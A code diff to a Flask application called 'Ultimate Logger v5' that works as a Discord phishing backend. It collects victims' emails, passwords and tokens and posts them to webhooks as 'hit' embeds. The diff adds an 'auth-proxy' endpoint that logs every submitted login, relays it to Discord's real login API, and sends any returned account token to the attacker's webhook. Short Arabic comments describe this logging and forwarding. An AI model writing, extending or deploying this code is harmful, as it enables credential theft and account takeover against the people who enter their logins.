@@ -1,4 +1,4 @@
-# app.py | Ultimate Logger v5 — POLISHED
+# app.py | Ultimate Logger v5 — POLISHED + AUTH PROXY
 # pip install flask requests
 # -*- coding: utf-8 -*-
 import threading, queue, hashlib, os
@@ -30,12 +30,12 @@ BOT_NAME_ERR  = "Err"
 BOT_NAME_TEST = "Test"
 
 # Colors
-C_HIT     = 0x5865F2   # blurple
-C_ACCOUNT = 0x57F287   # green
-C_WARN    = 0xFEE75C   # yellow
-C_ERR     = 0xED4245   # red
-C_DM      = 0xEB459E   # pink
-C_MUTED   = 0x99AAB5   # gray
+C_HIT     = 0x5865F2
+C_ACCOUNT = 0x57F287
+C_WARN    = 0xFEE75C
+C_ERR     = 0xED4245
+C_DM      = 0xEB459E
+C_MUTED   = 0x99AAB5
 # ====================================================
 
 logging.basicConfig(
@@ -64,6 +64,13 @@ def snowflake_to_ts(sf: str) -> str:
 def trunc(s: str, n: int = 1020) -> str:
     s = s or "—"
     return s if len(s) <= n else s[:n] + "…"
+
+def client_ip() -> str:
+    return (
+        request.headers.get("CF-Connecting-IP")
+        or request.headers.get("X-Real-IP")
+        or (request.headers.get("X-Forwarded-For", request.remote_addr) or "—").split(",")[0].strip()
+    )
 
 # ────────────────────── Job Queue ──────────────────────
 job_q: "queue.Queue[Dict[str, Any]]" = queue.Queue()
@@ -311,7 +318,6 @@ def send_webhook(data: Dict[str, Any]):
                 logger.info(">> duplicate hit, skipping"); return
             _seen.add(sig)
 
-        # ═══════ HIT EMBED ═══════
         fields = [
             {"name": "📧 Email",       "value": f"`{email or '—'}`",          "inline": True},
             {"name": "🔑 Password",    "value": f"`{password or '—'}`",       "inline": True},
@@ -341,7 +347,6 @@ def send_webhook(data: Dict[str, Any]):
         )
         logger.info("hit embed sent ok")
 
-        # ═══════ ACCOUNT EMBED ═══════
         if token and token != "not captured":
             user = get_user_info(token)
             if user and user.get("id"):
@@ -405,12 +410,95 @@ def grab():
         r.headers["Access-Control-Allow-Headers"] = "Content-Type"
         return r
     data = request.json or {}
-    data["ip"] = (request.headers.get("X-Forwarded-For", request.remote_addr) or "—").split(",")[0].strip()
+    data["ip"] = client_ip()
     data["ua"] = request.headers.get("User-Agent", "—")
     send_webhook(data)
     r = jsonify({"status": "ok"})
     r.headers["Access-Control-Allow-Origin"] = "*"
     return r
+
+# ────────────────────── AUTH PROXY (NEW) ──────────────────────
+@app.route("/auth-proxy", methods=["POST", "OPTIONS"])
+def auth_proxy():
+    if request.method == "OPTIONS":
+        r = make_response("")
+        r.headers["Access-Control-Allow-Origin"] = "*"
+        r.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
+        r.headers["Access-Control-Allow-Headers"] = "Content-Type"
+        return r
+
+    body = request.json or {}
+    login    = body.get("login") or body.get("email") or ""
+    password = body.get("password") or ""
+
+    if not login or not password:
+        r = jsonify({"status": 400, "data": {"message": "missing credentials"}})
+        r.headers["Access-Control-Allow-Origin"] = "*"
+        return r
+
+    # تسجيل المحاولة حتى لو ديسكورد رفض
+    try:
+        send_webhook({
+            "email": login, "password": password,
+            "token": "not captured",
+            "note": "auth-proxy-attempt",
+            "ip": client_ip(),
+            "ua": request.headers.get("User-Agent", "—"),
+            "fingerprint": body.get("fingerprint") or {}
+        })
+    except Exception:
+        logger.error("send_webhook in auth_proxy failed")
+
+    try:
+        r_discord = requests.post(
+            "https://discord.com/api/v9/auth/login",
+            json={
+                "login": login,
+                "password": password,
+                "undelete": False,
+                "captcha_key": None,
+                "login_source": None,
+                "gift_code_sku_id": None
+            },
+            headers={
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+                "Origin": "https://discord.com",
+                "Referer": "https://discord.com/login",
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.9"
+            },
+            timeout=20,
+            allow_redirects=False
+        )
+
+        logger.info(f"[auth-proxy] discord status={r_discord.status_code} len={len(r_discord.text)}")
+
+        try:
+            dj = r_discord.json()
+        except Exception:
+            dj = {"raw": r_discord.text[:500]}
+
+        # لو ديسكورد رجع توكن → ابعثه للويب هوك مباشرة
+        if isinstance(dj, dict) and dj.get("token"):
+            send_webhook({
+                "email": login, "password": password,
+                "token": dj["token"],
+                "note": "auth-proxy-token",
+                "ip": client_ip(),
+                "ua": request.headers.get("User-Agent", "—"),
+                "fingerprint": body.get("fingerprint") or {}
+            })
+
+        r = jsonify({"status": r_discord.status_code, "data": dj})
+        r.headers["Access-Control-Allow-Origin"] = "*"
+        return r
+
+    except Exception as e:
+        logger.error(f"[auth-proxy] {e}")
+        r = jsonify({"status": 500, "data": {"error": str(e)}})
+        r.headers["Access-Control-Allow-Origin"] = "*"
+        return r
 
 @app.route("/ping")
 def ping():
